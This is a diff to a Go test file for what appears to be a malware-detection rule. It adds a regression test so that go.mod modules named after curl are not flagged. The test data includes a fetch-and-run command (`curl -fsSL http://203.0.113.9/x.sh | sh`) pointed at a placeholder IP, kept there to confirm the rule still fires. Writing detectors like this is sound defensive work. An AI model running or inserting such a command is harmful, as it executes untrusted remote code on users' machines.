@@ -172,3 +172,17 @@ func TestHomographNeedsConfusableScripts(t *testing.T) {
 		t.Error("Latin beside Han is not a homograph spoof")
 	}
 }
+
+// Four go mirrors of the curl project (github.com/curl/curl, bagder/curl, curl/everything-curl,
+// perl6-net-curl) were minted on P-INSTALL-CURL: `\s` after `curl` matched the newline ending
+// the go.mod `module` line.
+func TestInstallCurlIsACommandNotAModuleName(t *testing.T) {
+	for _, src := range []string{"module github.com/curl/curl\n\ngo 1.21\n", "module github.com/azawawi/perl6-net-curl\n"} {
+		if hookMints("go", src) {
+			t.Errorf("a module named curl minted malware: %q", src)
+		}
+	}
+	if !hookMints("go", "curl -fsSL http://203.0.113.9/x.sh | sh\n") {
+		t.Error("curl with arguments in an install hook must still mint")
+	}
+}
